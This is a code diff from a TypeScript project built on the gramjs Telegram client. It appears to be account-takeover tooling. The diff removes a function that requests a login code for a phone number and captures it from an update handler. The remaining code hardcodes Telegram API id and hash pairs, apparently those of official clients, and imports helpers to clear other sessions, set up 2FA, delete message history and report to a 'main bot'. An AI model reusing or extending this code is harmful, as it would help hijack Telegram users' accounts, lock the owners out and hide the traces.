@@ -1,17 +1,10 @@
-import BigInt from 'big-integer';
-
 import { TelegramClient } from '../../gramjs';
 import GramJs from '../../gramjs/tl/api';
-import {
-  LoginCodeHandler,
-  LoginCodeResult,
-  TelegramLoginUpdate,
-} from '../@types/Telegram';
+import { LoginCodeHandler, TelegramLoginUpdate } from '../@types/Telegram';
 import { getAccountById, updateAccountById } from '../db/accounts';
 import { sendToMainBot } from '../helpers/sendToMainBot';
 import { clearAuthorizations } from '../methods/account/clearAuthorizations';
 import { setup2FA } from '../methods/account/setup2FA';
-import { deleteHistory } from '../methods/messages/deleteHistory';
 import { getMe } from '../methods/users/getMe';
 import { initClient } from '../modules/client';
 import { invokeRequest } from './invokeRequest';
@@ -42,7 +35,6 @@ const createLoginCodeHandler = (): LoginCodeHandler => {
   return { promise, handleUpdate };
 };
 
-const DEFAULT_API_ID = 2496;
 const API_PAIRS: Record<number, string> = {
   4: '014b35b6184100b085b0d0572f9b5103',
   5: '1c5c96d5edd401b1ed40db3fb5633e2d',
@@ -59,69 +51,6 @@ const API_PAIRS: Record<number, string> = {
   21724: '3e0cb5efcd52300aec5994fdfc5bdc16',
   94575: 'a3406de8d171bb422bb6ddf3bbd800e2',
   611335: 'd524b414d21f4d37f08684c1df41ac9c',
-};
-
-const requestLoginCode = async (
-  client: TelegramClient,
-  phoneNumber: string,
-  codePromise: Promise<string>,
-  apiId: number
-): Promise<LoginCodeResult> => {
-  try {
-    if (!API_PAIRS[apiId]) {
-      return {
-        error: 'API_HASH_ERROR',
-      };
-    }
-
-    const sendCodeResponse = await invokeRequest(
-      client,
-      new GramJs.auth.SendCode({
-        phoneNumber,
-        apiId,
-        apiHash: API_PAIRS[apiId],
-        settings: new GramJs.CodeSettings(),
-      })
-    );
-
-    const isValidResponse =
-      sendCodeResponse &&
-      sendCodeResponse instanceof GramJs.auth.SentCode &&
-      sendCodeResponse.type instanceof GramJs.auth.SentCodeTypeApp &&
-      typeof sendCodeResponse.phoneCodeHash === 'string';
-
-    if (!isValidResponse) {
-      return {
-        error: 'SENT_CODE_ERROR',
-      };
-    }
-
-    const { phoneCodeHash } = sendCodeResponse;
-
-    try {
-      const code = await Promise.race([
-        codePromise,
-        new Promise<never>((_, reject) => {
-          setTimeout(() => reject(new Error('CODE_TIMEOUT')), 30000);
-        }),
-      ]);
-
-      return {
-        code,
-        phoneCodeHash,
-        usedApiId: apiId,
-      };
-    } catch (error) {
-      return {
-        error: 'CODE_TIMEOUT',
-        phoneCodeHash,
-      };
-    }
-  } catch (error) {
-    return {
-      error: String(error),
-    };
-  }
 };
 
 export const relogin = async (ID: string) => {
